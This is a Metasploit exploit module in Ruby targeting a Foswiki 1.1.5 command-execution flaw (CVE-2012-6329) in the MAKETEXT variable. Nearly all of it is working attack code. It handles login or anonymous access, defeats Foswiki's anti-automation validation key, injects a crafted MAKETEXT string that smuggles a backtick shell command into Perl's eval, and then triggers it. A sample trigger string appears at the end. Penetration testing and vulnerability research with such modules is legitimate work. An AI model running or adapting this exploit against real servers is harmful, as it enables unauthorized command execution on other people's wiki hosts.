##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Foswiki MAKETEXT Remote Command Execution',
			'Description'    => %q{
					This module exploits a vulnerability in the MAKETEXT Foswiki variable. By using
				a specially crafted MAKETEXT, a malicious user can execute shell commands since the
				input is passed to the Perl "eval" command without first being sanitized. The
				problem is caused by an underlying security issue in the CPAN:Locale::Maketext
				module.  Only Foswiki sites that have user interface localization enabled
				(UserInterfaceInternationalisation variable set) are vulnerable.

					If USERNAME and PASSWORD aren't provided, anonymous access will be tried.
				Also, if the FoswikiPage option isn't provided, the module will try to create a
				random page on the SandBox space. The modules has been tested successfully on
				Foswiki 1.1.5 as distributed with the official Foswiki-1.1.5-vmware image.
			},
			'Author'         =>
				[
					'Brian Carlson', # original discovery in Perl Locale::Maketext
					'juan vazquez' # Metasploit module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2012-6329' ],
					[ 'OSVDB', '88410' ],
					[ 'URL', 'http://foswiki.org/Support/SecurityAlert-CVE-2012-6330' ]
				],
			'Privileged'     => false, # web server context
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 1024,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic ruby python bash telnet'
						}
				},
			'Platform'       => [ 'unix' ],
			'Arch'           => ARCH_CMD,
			'Targets'        => [[ 'Foswiki 1.1.5', { }]],
			'DisclosureDate' => 'Dec 03 2012',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('TARGETURI', [ true, "Foswiki base path", "/" ]),
				OptString.new('FoswikiPage', [ false, "Foswiki Page with edit permissions to inject the payload, by default random Page on Sandbox (Ex: /Sandbox/MsfTest)" ]),
				OptString.new('USERNAME', [ false,  "The user to authenticate as (anonymous if username not provided)"]),
				OptString.new('PASSWORD', [ false,  "The password to authenticate with (anonymous if password not provided)" ])
			], self.class)
	end

	def do_login(username, password)
		res = send_request_cgi({
			'method'   => 'POST',
			'uri'      => "#{@base}bin/login",
			'vars_post' =>
				{
					'username' => username,
					'password' => password
				}
			})

		if not res or res.code != 302 or res.headers['Set-Cookie'] !~ /FOSWIKISID=([0-9a-f]*)/
			vprint_status "#{res.code}\n#{res.body}"
			return nil
		end

		session = $1
		return session
	end

	def inject_code(session, code)

		vprint_status("Retrieving the validation_key...")

		res = send_request_cgi({
			'uri'      => "#{@base}bin/edit#{@page}",
			'cookie'   => "FOSWIKISID=#{session}"
		})

		if not res or res.code != 200 or res.body !~ /name='validation_key' value='\?([0-9a-f]*)'/
			vprint_error("Error retrieving the validation_key")
			return nil
		end

		validation_key = $1
		vprint_good("validation_key found: #{validation_key}")

		if session.empty?
			if res.headers['Set-Cookie'] =~ /FOSWIKISID=([0-9a-f]*)/
				session = $1
			else
				vprint_error("Error using anonymous access")
				return nil
			end
		end

		if res.headers['Set-Cookie'] =~ /FOSWIKISTRIKEONE=([0-9a-f]*)/
			strike_one = $1
		else
			vprint_error("Error getting the FOSWIKISTRIKEONE value")
			return nil
		end

		# Transforming validation_key in order to bypass foswiki antiautomation
		validation_key = Rex::Text.md5(validation_key + strike_one)
		vprint_status("Transformed validation key: #{validation_key}")
		vprint_status("Injecting the payload...")

		res = send_request_cgi({
			'method'   => 'POST',
			'uri'      => "#{@base}bin/save#{@page}",
			'cookie'   => "FOSWIKISID=#{session}",
			'vars_post' =>
			{
				'validation_key' => validation_key,
				'text' => "#{rand_text_alpha(3 + rand(3))} %MAKETEXT{\"#{rand_text_alpha(3 + rand(3))} [_1] #{rand_text_alpha(3 + rand(3))}\\\\'}; `#{code}`; { #\" args=\"#{rand_text_alpha(3 + rand(3))}\"}%"
			}

		})

		if not res or res.code != 302 or res.headers['Location'] !~ /bin\/view#{@page}/
			print_warning("Error injecting the payload")
			print_status "#{res.code}\n#{res.body}\n#{res.headers['Location']}"
			return nil
		end

		location = URI(res.headers['Location']).path
		print_good("Payload injected on #{location}")

		return location
	end

	def check
		@base = target_uri.path
		@base << '/' if @base[-1, 1] != '/'

		res = send_request_cgi({
			'uri'      => "#{@base}System/WebHome"
		})

		if not res or res.code != 200
			return Exploit::CheckCode::Unknown
		end

		if res.body =~ /This site is running Foswiki version.*Foswiki-(\d\.\d\.\d)/
			version = $1
			print_status("Version found: #{version}")
			if version <= "1.1.6"
				return Exploit::CheckCode::Appears
			else
				return Exploit::CheckCode::Safe
			end
		end

		return Exploit::CheckCode::Detected
	end


	def exploit

		# Init variables
		@page = ''

		if datastore['FoswikiPage'] and not datastore['FoswikiPage'].empty?
			@page << '/' if datastore['FoswikiPage'][0] != '/'
			@page << datastore['FoswikiPage']
		else
			@page << "/Sandbox/#{rand_text_alpha_lower(3).capitalize}#{rand_text_alpha_lower(3).capitalize}"
		end

		@base = target_uri.path
		@base << '/' if @base[-1, 1] != '/'

		# Login if needed
		if (datastore['USERNAME'] and
			not datastore['USERNAME'].empty? and
			datastore['PASSWORD'] and
			not datastore['PASSWORD'].empty?)
			print_status("Trying login to get session ID...")
			session = do_login(datastore['USERNAME'], datastore['PASSWORD'])
		else
			print_status("Using anonymous access...")
			session = ""
		end

		if not session
			fail_with(Exploit::Failure::Unknown, "Error getting a session ID")
		end

		# Inject payload
		print_status("Trying to inject the payload on #{@page}...")
		res = inject_code(session, payload.encoded)
		if not res or res !~ /#{@page}/
			fail_with(Exploit::Failure::Unknown, "Error injecting the payload")
		end

		# Execute payload
		print_status("Executing the payload through #{@page}...")
		res = send_request_cgi({
			'uri'      => "#{@base}#{@page}",
			'cookie'   => "FOSWIKISID=#{session}"
		})
		if not res or res.code != 200 or res.body !~ /HASH/
			print_status("#{res.code}\n#{res.body}")
			fail_with(Exploit::Failure::Unknown, "Error executing the payload")
		end

		print_good("Exploitation was successful")

	end

end

=begin

* Trigger:

%MAKETEXT{"test [_1] secondtest\\'}; `touch /tmp/msf.txt`; { #" args="msf"}%

=end